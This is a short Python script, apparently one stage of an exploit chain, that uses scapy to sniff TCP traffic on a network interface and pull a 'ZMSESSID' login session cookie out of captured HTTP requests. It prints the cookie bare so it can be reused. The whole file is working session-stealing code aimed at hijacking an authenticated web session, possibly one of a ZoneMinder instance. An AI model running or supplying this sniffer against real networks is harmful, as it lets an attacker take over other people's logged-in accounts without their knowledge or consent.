import time
from scapy.all import sniff, TCP, Raw


def extract_zmsessid(payload):
    # Search for the ZMSESSID in the payload
    for line in payload.split("\n"):
        if "ZMSESSID=" in line:
            # Extract and return the ZMSESSID value
            start = line.find("ZMSESSID=") + len("ZMSESSID=")
            end = line.find(";", start) if ";" in line[start:] else len(line)
            return line[start:end].strip()
    return None


def packet_callback(packet):
    if packet.haslayer(TCP) and packet.haslayer(Raw):
        try:
            payload = packet[Raw].load.decode(errors='ignore')
            if "POST" in payload or "GET" in payload:
                time.sleep(10)  # wait for 10 seconds before extracting the session ID
                zmsessid = extract_zmsessid(payload)
                if zmsessid:
                    print(zmsessid.strip(), end='')
                    raise KeyboardInterrupt
        except Exception as e:
            print(f"Could not decode payload: {e}")


# Start sniffing until we get the login session ID
try:
    sniff(iface="ens3", prn=packet_callback, store=0)
except KeyboardInterrupt:
    print("Sniffing stopped.")
